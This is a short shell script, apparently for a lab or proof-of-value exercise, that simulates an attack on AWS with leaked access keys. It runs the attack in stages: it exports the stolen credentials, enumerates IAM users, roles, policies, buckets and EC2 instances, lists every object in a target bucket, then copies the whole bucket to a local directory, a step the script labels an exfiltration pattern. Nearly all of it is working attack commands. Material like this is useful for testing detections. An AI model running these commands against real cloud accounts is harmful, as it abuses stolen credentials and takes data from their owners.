# Stage 1 — Discovery burst from attacker host.
export AWS_ACCESS_KEY_ID=${LEAKED_KEY_ID}
export AWS_SECRET_ACCESS_KEY=${LEAKED_KEY_SECRET}
export AWS_DEFAULT_REGION=${LAB_REGION}

aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')
aws s3api list-buckets
aws ec2 describe-instances --region ${LAB_REGION}

# Stage 2 — Object enumeration on target bucket.
aws s3 ls s3://${LAB_BUCKET} --recursive

# Stage 3 — Bulk object pull (exfil pattern).
mkdir -p /tmp/pov-exfil-${POV_RUN_ID}
aws s3 cp s3://${LAB_BUCKET} /tmp/pov-exfil-${POV_RUN_ID}/ --recursive --quiet
ls -la /tmp/pov-exfil-${POV_RUN_ID}/ | wc -l
